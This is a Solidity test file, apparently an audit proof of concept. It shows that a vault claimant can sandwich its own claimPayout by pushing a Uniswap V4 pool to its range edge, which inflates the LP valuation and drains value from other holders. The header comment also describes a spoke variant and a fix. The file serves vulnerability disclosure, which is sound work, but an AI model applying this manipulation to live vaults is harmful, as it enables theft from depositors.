// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {HubStackFixture} from "./HubStackFixture.sol";
import {ICoreVault} from "../../../src/interfaces/ICoreVault.sol";

/// @title POC: a claimant moves the pool price and is paid on an LP composition marked at the oracle price
/// @notice SEVERITY: medium (bounded value leak from the remaining holders to any exiter, repeatable on every claim,
///         cheap on a thin pool; the same defect on a spoke is carried by the permissionless `report()`).
///
/// ATTACK
///   Share Assets value a Uniswap V4 position as `principal0 * oraclePrice(token0) + principal1` where the split
///   `(principal0, principal1)` is the pool's CURRENT composition (`UniswapV4Adapter.positionValue` ->
///   `_principal(position, liquidity)` at `slot0`, UniswapV4Adapter.sol:266-284 and 621-637) and the price is the
///   external `IPriceSource` (CoreVaultLogic.sol:235-248, 307-317). The composition of a concentrated position moves
///   with the pool price while the oracle does not, and for an LP (short gamma) the holdings taken at any pool price
///   `p` are worth MORE at the oracle price `P` than the position is worth at `P`:
///     marked(p) - value(P) = L * (sqrt(P) - sqrt(p))^2 / sqrt(p) >= 0
///   so pushing the pool to either edge of the range inflates the marked principal by about a quarter of the range
///   width: +1.27% for a 5% half-range (measured below), +6.5% for a 20% one, and it never deflates it.
///   A claimant therefore sandwiches its own claim in one transaction: swap to push the pool to the range edge, call
///   `claimPayout` (priced live by `_priceClaim` -> `recordValuation` -> `hubSpokeVault.buildReport()`), swap back.
///   Free Idle pays the claim, so nothing is realized at the manipulated price: the fund keeps the position, restores
///   its true value when the price returns, and the remaining holders have paid the difference. The manipulation
///   costs only the pool fee on the volume needed to reach the range edge, which on the fund's own thin pool is a few
///   basis points of the position (flash-loanable capital). Only exits gain, so deposits are not the mirror image.
///   Spoke variant: `SpokeVault.report()` is permissionless and takes the same live split (SpokeCrossChainLib.sol:
///   154-161); pushing the spoke pool, calling `report()` and restoring it puts the inflated composition into the
///   report the hub accepts for up to `maxReportAge`, during which every claim is overpaid and the attacker may also
///   choose the delivery moment.
///
/// IMPACT
///   Here bob holds 20% of a fund whose hub position is 100,000 USDC in a 5% half-range; pushing the pool 5% adds
///   1,266 USDC to Share Assets and about 250 USDC to his payout, taken from alice, for a swap fee of a few USDC on a
///   thin pool. Wider ranges and larger LP shares scale it: a fund fully in full-range positions leaks 6% of a
///   50% price push. Nothing in the contracts bounds the pool price against the oracle (QA3 and Q57 (b) are OPEN,
///   but the docs only discuss the unwind swap floor, not the valuation).
///
/// FIX
///   Value a position at the ORACLE price, not at the pool's spot: compute `(principal0, principal1)` from the
///   liquidity, the range and `sqrtPrice(oracle)` (the report already carries `liquidity`, `tickLower`, `tickUpper`),
///   or take `min(marked at spot, marked at oracle)` for payouts and the max for mints (the two-sided reading of
///   Q57 alternative 3). On the spoke, carry liquidity and ticks (already done) and let the hub do the pricing.
contract POC_CompositionMarking is HubStackFixture {
    function test_POC_claimantInflatesShareAssetsByMovingThePoolPrice() public {
        _deposit(alice, 200_000e6);
        bytes32 positionKey = _openHubPosition(100_000e6, 50_000e6, 50_000e6);
        _deposit(bob, 50_000e6); // bob enters at the true price
        uint256 trueValue = _markedPositionValue(positionKey);
        uint256 trueAssets = vault.shareAssets();

        // Counterfactual: bob exits at the true price.
        uint256 snapshot = vm.snapshotState();
        _request(bob, 100_000e6, ICoreVault.PayoutMode.Instant);
        ICoreVault.PayoutReceipt memory honest = _claim(bob);
        uint256 aliceAssetsHonest = vault.shareAssets();
        vm.revertToState(snapshot);

        // Attack, all in one transaction from bob's contract: push the pool to the lower edge of the fund's range (a
        // swap on the pool; MockV4 has no price impact so the move is applied directly), claim, restore.
        v4.setTick(poolId, TRUE_TICK - HALF_RANGE);
        uint256 markedValue = _markedPositionValue(positionKey);
        assertGt(markedValue, trueValue);
        assertApproxEqRel(markedValue - trueValue, trueValue * 127 / 10_000, 0.05e18); // about +1.27%
        assertGt(vault.shareAssets(), trueAssets);

        _request(bob, 100_000e6, ICoreVault.PayoutMode.Instant);
        ICoreVault.PayoutReceipt memory attack = _claim(bob);
        v4.setTick(poolId, TRUE_TICK);

        // Bob burned the same shares and was paid more, from Free Idle (nothing was unwound or realized).
        assertEq(attack.sharesBurned, honest.sharesBurned);
        assertEq(attack.unwindProceeds, 0);
        assertEq(honest.unwindProceeds, 0);
        assertGt(attack.usdcPaid, honest.usdcPaid);
        uint256 leak = attack.usdcPaid - honest.usdcPaid;
        emit log_named_uint("extra USDC paid to bob", leak);
        assertGt(leak, 200e6);

        // The position is untouched and back at its true value; the difference came out of alice.
        assertEq(_markedPositionValue(positionKey), trueValue);
        assertLt(vault.shareAssets(), aliceAssetsHonest);
        assertApproxEqAbs(aliceAssetsHonest - vault.shareAssets(), attack.usdcGross - honest.usdcGross, 1);
    }
}
